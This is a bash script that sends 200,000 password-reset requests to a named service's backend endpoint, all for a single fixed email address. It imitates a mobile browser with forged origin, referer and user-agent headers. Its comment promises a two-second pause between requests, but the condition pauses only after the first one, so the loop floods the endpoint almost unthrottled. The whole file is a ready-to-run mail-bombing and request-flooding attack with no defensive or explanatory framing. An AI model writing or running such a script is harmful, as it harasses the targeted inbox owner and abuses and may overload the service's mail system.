#!/bin/bash

URL="https://backend.swiftuni.com/app/users/send-password-reset-mail"
EMAIL='{"email":"havebor871@buloan.com"}'

for i in {1..200000}; do
  echo "Sending request $i..."
  
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "$URL" \
    -H 'accept: */*' \
    -H 'accept-language: en-US,en;q=0.7' \
    -H 'cache-control: no-cache' \
    -H 'content-type: application/json' \
    -H 'origin: https://app.swiftuni.com' \
    -H 'pragma: no-cache' \
    -H 'priority: u=1, i' \
    -H 'referer: https://app.swiftuni.com/' \
    -H 'sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Brave";v="150"' \
    -H 'sec-ch-ua-mobile: ?1' \
    -H 'sec-ch-ua-platform: "Android"' \
    -H 'sec-fetch-dest: empty' \
    -H 'sec-fetch-mode: cors' \
    -H 'sec-fetch-site: same-site' \
    -H 'sec-gpc: 1' \
    -H 'user-agent: Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36' \
    --data-raw "$EMAIL")
  
  echo "Response: HTTP $CODE"
  
  # Sleep 2 seconds between requests (skip after last one)
  [ "$i" -lt 2 ] && sleep 2
done

echo "Done!"
